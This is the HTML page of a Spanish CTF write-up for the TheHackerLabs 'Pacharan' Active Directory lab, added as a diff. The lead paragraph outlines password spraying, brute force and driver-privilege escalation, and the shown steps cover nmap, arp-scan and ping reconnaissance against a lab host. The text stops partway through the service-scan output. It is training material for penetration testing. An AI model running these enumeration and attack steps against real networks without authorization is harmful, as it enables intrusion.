@@ -1,0 +1,1428 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pacharan - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-pacharan/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Pacharan - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-pacharan/pacharan.jpg">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-papafrita/">
+          <span class="side-post-card-title">Papafrita</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-academy/">
+          <span class="side-post-card-title">Academy</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Pacharan</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-cyberpunk/">
+          <span class="side-post-card-title">Cyberpunk</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-zapasguapas/">
+          <span class="side-post-card-title">Zapas Guapas</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Medium Machine</div>
+    
+    <h1>Pacharan - TheHackerLabs</h1>
+    <div class="post-meta">24 February 2025 · 24 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-pacharan/pacharan.jpg" alt="Pacharan - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina algo complicada. Después de analizar los escaneos, descubrimos que estamos ante un Active Directory (AD) y asumimos que no podemos hacer nada más que comenzar a enumerar usuarios al servicio Kerberos, esto para encontrar usuarios válidos que puedan ser utilizados para enumerar el servicio SMB. Encontrando un usuario válido, podemos enumerar los recursos compartidos del SMB en donde encontramos una contraseña de otro usuario. Aplicando Password Spraying, descubrimos a quién le pertenece esta contraseña. Usamos esas nuevas credenciales para volver a enumerar los recursos compartidos del SMB, encontrando otro archivo que contiene una lista de contraseñas. Aplicando Fuerza Bruta con crackmapexec, descubrimos a un usuario con una contraseña válida de la lista. Con estas nuevas credenciales, enumeramos el servicio RPC, en donde encontramos una contraseña en texto claro al mostrar la información de las impresoras activas. Usamos esa contraseña para aplicar Password Spraying a todos los usuarios del AD, descubriendo a quien le pertenece. Usamos estas nuevas credenciales para entrar el servicio WinRM con la herramienta evil-winrm. Por último, dentro de la máquina vemos que tenemos el permiso SeLoadDriverPrivilege, del cual nos podemos aprovechar para poder escalar privilegios.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>arp-scan</code></li><li><code>crackmapexec</code></li><li><code>smbmap</code></li><li><code>kerbrute_linux_amd64</code></li><li><code>rpcclient</code></li><li><code>evil-winrm</code></li><li><code>git</code></li><li><code>rlwrap</code></li><li><code>nc</code></li><li><code>msfvenom</code></li><li><code>Metasploit Framework (msfconsole)</code></li><li><code>Meterpreter</code></li><li><code>Módulo: exploit/windows/misc/hta_server</code></li><li><code>Módulo: post/multi/recon/local_exploit_suggester</code></li><li><code>Módulo: exploit/windows/local/cve_2024_35250_ks_driver</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Kerberos">Enumeración de Usuarios del Servicio Kerberos</a></li>
+        <li><a href="#SMB">Enumeración de Servicio SMB</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#RPC">Enumeración del Servicio RPC y Obteniendo Sesión con evil-winrm</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Privesc">Abusando del Privilegio SeLoadDriverPrivilege para Escalar Privilegios</a></li>
+        <li><a href="#EnumWin">Enumeración de Máquina Windows con Módulo de local_exploit_suggester de Metasploit y Escalando Privilegios con cve_2024_35250_ks_driver</a>
+          <ul>
+            <li><a href="#HTA">Levantando Servidor HTA y Obteniendo Sesión de Meterpreter</a></li>
+            <li><a href="#Suggester">Utilizando Módulo local_exploit_suggester y Probando Exploit cve_2024_35250_ks_driver</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Kerberos">Enumeración de Usuarios del Servicio Kerberos</a></li>
+        <li><a href="#SMB">Enumeración de Servicio SMB</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#RPC">Enumeración del Servicio RPC y Obteniendo Sesión con evil-winrm</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Privesc">Abusando del Privilegio SeLoadDriverPrivilege para Escalar Privilegios</a></li>
+        <li><a href="#EnumWin">Enumeración de Máquina Windows con Módulo de local_exploit_suggester de Metasploit y Escalando Privilegios con cve_2024_35250_ks_driver</a>
+          <ul>
+            <li><a href="#HTA">Levantando Servidor HTA y Obteniendo Sesión de Meterpreter</a></li>
+            <li><a href="#Suggester">Utilizando Módulo local_exploit_suggester y Probando Exploit cve_2024_35250_ks_driver</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Hosts">Descubrimiento de Hosts</h3>
+<p>Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.</p>
+<p>Lo haremos primero con <strong>nmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 192.168.69.0/24
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-24 13:26 CST
+</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.69.69
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00092s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">256</span> IP addresses <span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> hosts up<span style="color:#f92672">)</span> scanned in 1.94 seconds
+</span></span></code></pre></div><p>Vamos a probar la herramienta <strong>arp-scan</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arp-scan -I eth0 -g 192.168.69.0/24
+</span></span><span style="display:flex;"><span>Interface: eth0, type: EN10MB, MAC:XX, IPv4: Tu_IP
+</span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>192.168.69.69	XX	PCS Systemtechnik GmbH
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
+</span></span><span style="display:flex;"><span>Ending arp-scan 1.10.0: <span style="color:#ae81ff">256</span> hosts scanned in 2.081 seconds <span style="color:#f92672">(</span>123.02 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">3</span> responded
+</span></span></code></pre></div><p>Encontramos nuestro objetivo y es: <code>192.168.69.69</code></p>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.69.69
+</span></span><span style="display:flex;"><span>PING 192.168.69.69 <span style="color:#f92672">(</span>192.168.69.69<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.69.69: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>1.51 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.69.69: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>1.03 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.69.69: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.838 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.69.69: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.824 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.69.69 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3008ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.824/1.048/1.505/0.275 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Windows</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.69.69 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-24 13:27 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 13:27
+</span></span><span style="display:flex;"><span>Scanning 192.168.69.69 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 13:27, 0.06s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 13:27
+</span></span><span style="display:flex;"><span>Scanning 192.168.69.69 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 53/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 389/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 49667/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 49671/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 49676/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 49665/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 49664/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 3269/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 60909/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 49666/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 3268/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 49673/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 5985/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 49669/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 593/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 636/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 88/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 47001/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 49670/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 192.168.69.69 from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span> due to max_successful_tryno increase to <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>Discovered open port 464/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 49691/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Discovered open port 9389/tcp on 192.168.69.69
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 13:27, 41.39s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.69.69
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.0020s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-02-24 13:27:08 CST <span style="color:#66d9ef">for</span> 41s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65510</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE          REASON
+</span></span><span style="display:flex;"><span>53/tcp    open  domain           syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec     syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc            syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap             syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds     syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5         syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>593/tcp   open  http-rpc-epmap   syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>636/tcp   open  ldapssl          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>3268/tcp  open  globalcatLDAP    syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  globalcatLDAPssl syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>5985/tcp  open  wsman            syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>9389/tcp  open  adws             syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>47001/tcp open  winrm            syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49664/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49665/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49666/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49667/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49669/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49670/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49671/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49673/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49676/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49691/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>60909/tcp open  unknown          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 41.64 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">128995</span> <span style="color:#f92672">(</span>5.676MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65539</span> <span style="color:#f92672">(</span>2.622MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Hay muchos puertos abiertos, pero estoy viendo algunos que nos dicen que estamos contra una máquina con <strong>Active Directory (AD)</strong>.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49676,49691,60909 192.168.69.69 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-24 13:30 CST
+</span></span><span style="display:flex;"><span>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.69.69
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0016s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-02-24 18:29:21Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: PACHARAN.THL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: PACHARAN.THL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49669/tcp open  msrpc         Microsoft Windows RPC
